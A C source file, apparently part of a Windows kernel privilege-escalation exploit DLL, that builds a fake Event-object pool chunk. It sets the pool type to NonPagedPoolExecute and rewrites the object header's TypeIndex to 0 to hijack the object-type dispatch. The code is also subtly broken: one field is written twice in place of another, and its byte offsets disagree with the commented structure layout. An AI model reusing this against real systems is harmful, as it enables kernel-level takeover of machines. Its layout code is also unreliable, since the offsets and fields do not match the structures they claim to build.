#include "exploit_dll.h"

// This should be the last time I have to remake these initialization functions.
// New Functions, rebuild of an Even (event object) pool structure.
void initialize_pool_header(PPOOL_HEADER input_pool_header)
{
	POOL_HEADER pool_header = *input_pool_header;	// dt nt!_POOL_HEADER b8c3fdc0

	pool_header.PreviousSize = 0;					// +0x000 PreviousSize     : 0y000000000 (0)
	pool_header.PoolIndex = 0;						// +0x000 PoolIndex        : 0y0000000 (0)
	pool_header.BlockSize = 0x8;					// +0x002 BlockSize        : 0y000001000 (0x8)
	pool_header.PoolType = NonPagedPoolExecute;		// +0x002 PoolType         : 0y0000010 (0x2) (Changed to NonPagedPoolExecute)
	pool_header.Ulong1 = 0x4080000;					// +0x000 Ulong1           : 0x4080000
	pool_header.PoolTag = POOL_TAG;					// +0x004 PoolTag          : 0x6e657645
	pool_header.AllocatorBackTraceIndex = 0x7645;	// +0x004 AllocatorBackTraceIndex : 0x7645
	pool_header.PoolTagHash = 0x6E65;				// +0x006 PoolTagHash      : 0x6e65

	*input_pool_header = pool_header;
}

void initialize_object_header_quota(POBJECT_HEADER_QUOTA input_object_header_quota)
{
	OBJECT_HEADER_QUOTA object_header_quota = *input_object_header_quota;	// dt nt!_OBJECT_HEADER_QUOTA_INFO b8c3fdc0+8

	object_header_quota.PagedPoolCharge = 0;								// +0x000 PagedPoolCharge  : 0
	object_header_quota.NonPagedPoolCharge = 0x40;							// +0x004 NonPagedPoolCharge : 0x40
	object_header_quota.SecurityDescriptorCharge = 0;						// +0x008 SecurityDescriptorCharge : 0
	object_header_quota.SecurityDescriptorQuotaBlock = (void*)0;			// +0x00c SecurityDescriptorQuotaBlock : (null)

	*input_object_header_quota = object_header_quota;
}

void initialize_ex_push_lock(PEX_PUSH_LOCK input_ex_push_lock)
{
	EX_PUSH_LOCK ex_push_lock = *input_ex_push_lock;	// dx -id 0,0,983b8840 -r1 (*((ntkrpamp!_EX_PUSH_LOCK *)0xb8c3fde0))

	ex_push_lock.Locked = 0;							// [+0x000 ( 0: 0)] Locked           : 0x0 [Type: unsigned long]
	ex_push_lock.Waiting = 0;							// [+0x000 ( 1: 1)] Waiting          : 0x0 [Type: unsigned long]
	ex_push_lock.Waking = 0;							// [+0x000 ( 2: 2)] Waking           : 0x0 [Type: unsigned long]
	ex_push_lock.MultipleShared = 0;					// [+0x000 ( 3: 3)] MultipleShared   : 0x0 [Type: unsigned long]
	ex_push_lock.Shared = 0;							// [+0x000 (31: 4)] Shared           : 0x0 [Type: unsigned long]
	ex_push_lock.Value = 0;								// [+0x000] Value            : 0x0 [Type: unsigned long]
	ex_push_lock.Ptr = (void*)0;						// [+0x000] Ptr              : 0x0 [Type: void *]

	*input_ex_push_lock = ex_push_lock;
}

void initialize_quad(PQUAD input_quad)
{
	QUAD quad = *input_quad;			// dx -id 0,0,983b8840 -r1 (*((ntkrpamp!_QUAD *)0xb8c3fdf0))

	quad.UseThisFieldToCopy = 262145;	// [+0x000] UseThisFieldToCopy : 262145 [Type: __int64]
	quad.DoNotUseThisField = 0.000000;	// [+0x000] DoNotUseThisField : 0.000000 [Type: double]

	*input_quad = quad;
}

void initialize_object_header(POBJECT_HEADER input_object_header, PEX_PUSH_LOCK input_ex_push_lock, PVOID input_heap_allocation_address, PQUAD input_quad)
{
	OBJECT_HEADER object_header = *input_object_header;					// dt nt!_OBJECT_HEADER b8c3fdc0+8+10

	object_header.PointerCount = 0x1;									// +0x000 PointerCount     : 0n1
	object_header.HandleCount = 0x1;									// +0x004 HandleCount      : 0n1
	object_header.NextToFree = (void*)0x1;								// +0x004 NextToFree       : 0x00000001 Void
	object_header.Lock = input_ex_push_lock;							// +0x008 Lock             : _EX_PUSH_LOCK
	object_header.TypeIndex = 0;										// +0x00c TypeIndex        : 0xfa '' (Changed to nt!ObTypeIndexTable+0x0, opposed to nt!ObTypeIndexTable+0xFA)
	object_header.TraceFlags = 0;										// +0x00d TraceFlags       : 0 ''
	object_header.DbgRefTrace = 0;										// +0x00d DbgRefTrace      : 0y0
	object_header.DbgTracePermanent = 0;								// +0x00d DbgTracePermanent : 0y0
	object_header.InfoMask = 0x8;										// +0x00e InfoMask         : 0x8 ''
	object_header.Flags = 0;											// +0x00f Flags            : 0 ''
	object_header.NewObject = 0;										// +0x00f NewObject        : 0y0
	object_header.KernelObject = 0;										// +0x00f KernelObject     : 0y0
	object_header.KernelOnlyAccess = 0;									// +0x00f KernelOnlyAccess : 0y0
	object_header.ExclusiveObject = 0;									// +0x00f ExclusiveObject  : 0y0
	object_header.PermanentObject = 0;									// +0x00f PermanentObject  : 0y0
	object_header.DefaultSecurityQuota = 0;								// +0x00f DefaultSecurityQuota : 0y0
	object_header.SingleHandleEntry = 0;								// +0x00f SingleHandleEntry : 0y0
	object_header.DeletedInline = 0;									// +0x00f DeletedInline    : 0y0
	object_header.ObjectCreateInfo = input_heap_allocation_address;		// +0x010 ObjectCreateInfo : 0x8f92bd40 _OBJECT_CREATE_INFORMATION
	object_header.QuotaBlockCharged = input_heap_allocation_address;	// +0x010 QuotaBlockCharged : 0x8f92bd40 Void
	object_header.SecurityDescriptor = (void*)0;						// +0x014 SecurityDescriptor : (null)
	object_header.Body = input_quad;									// +0x018 Body             : _QUAD

	*input_object_header = object_header;
}

void initialize_pool_structs(char* address, PPOOL_HEADER input_pool_header, POBJECT_HEADER_QUOTA input_object_header_quota, PEX_PUSH_LOCK input_push_lock, PQUAD input_quad, POBJECT_HEADER input_object_header)
{
	initialize_pool_header(input_pool_header);
	initialize_object_header_quota(input_object_header_quota);
	initialize_ex_push_lock(input_push_lock);
	initialize_quad(input_quad);
	initialize_object_header(input_object_header, input_push_lock, address, input_quad);
}

void build_pool_chunk(char* fake_pool_memory_page, POOL_HEADER pool_header, OBJECT_HEADER_QUOTA object_header_quota, OBJECT_HEADER object_header)
{
	// Pool Header Construction
	*(unsigned char*)fake_pool_memory_page = pool_header.PreviousSize;
	*(unsigned char*)(fake_pool_memory_page + 1) = pool_header.PoolIndex;
	*(unsigned char*)(fake_pool_memory_page + 2) = pool_header.BlockSize;
	*(unsigned char*)(fake_pool_memory_page + 3) = pool_header.PoolType;
	*(unsigned long*)(fake_pool_memory_page + 4) = pool_header.Ulong1;
	*(unsigned long*)(fake_pool_memory_page + 8) = pool_header.PoolTag;
	*(unsigned short*)(fake_pool_memory_page + 12) = pool_header.AllocatorBackTraceIndex;
	*(unsigned short*)(fake_pool_memory_page + 14) = pool_header.PoolTagHash;

	// Object Header Quota Info Construction
	*(unsigned long*)(fake_pool_memory_page + 16) = object_header_quota.PagedPoolCharge;
	*(unsigned long*)(fake_pool_memory_page + 20) = object_header_quota.PagedPoolCharge;
	*(unsigned long*)(fake_pool_memory_page + 24) = object_header_quota.SecurityDescriptorCharge;
	*(unsigned long*)(fake_pool_memory_page + 28) = object_header_quota.SecurityDescriptorQuotaBlock;

	// Object Header Construction
	*(unsigned long*)(fake_pool_memory_page + 32) = object_header.PointerCount;

	*(unsigned long*)(fake_pool_memory_page + 36) = object_header.HandleCount;
	*(unsigned long*)(fake_pool_memory_page + 40) = object_header.NextToFree;

	*(unsigned long*)(fake_pool_memory_page + 44) = object_header.Lock;
	*(unsigned char*)(fake_pool_memory_page + 48) = object_header.TypeIndex;
	*(unsigned char*)(fake_pool_memory_page + 49) = object_header.TraceFlags;

	*(unsigned char*)(fake_pool_memory_page + 50) = object_header.DbgRefTrace;
	*(unsigned char*)(fake_pool_memory_page + 51) = object_header.DbgTracePermanent;

	*(unsigned char*)(fake_pool_memory_page + 52) = object_header.InfoMask;
	*(unsigned char*)(fake_pool_memory_page + 53) = object_header.Flags;

	*(unsigned char*)(fake_pool_memory_page + 54) = object_header.NewObject;
	*(unsigned char*)(fake_pool_memory_page + 55) = object_header.KernelObject;
	*(unsigned char*)(fake_pool_memory_page + 56) = object_header.KernelOnlyAccess;
	*(unsigned char*)(fake_pool_memory_page + 57) = object_header.ExclusiveObject;
	*(unsigned char*)(fake_pool_memory_page + 58) = object_header.PermanentObject;
	*(unsigned char*)(fake_pool_memory_page + 59) = object_header.DefaultSecurityQuota;
	*(unsigned char*)(fake_pool_memory_page + 60) = object_header.SingleHandleEntry;
	*(unsigned char*)(fake_pool_memory_page + 61) = object_header.DeletedInline;

	*(unsigned long*)(fake_pool_memory_page + 62) = object_header.ObjectCreateInfo;
	*(unsigned long*)(fake_pool_memory_page + 66) = object_header.QuotaBlockCharged;

	*(unsigned long*)(fake_pool_memory_page + 70) = object_header.SecurityDescriptor;
	*(unsigned long*)(fake_pool_memory_page + 74) = object_header.Body;
}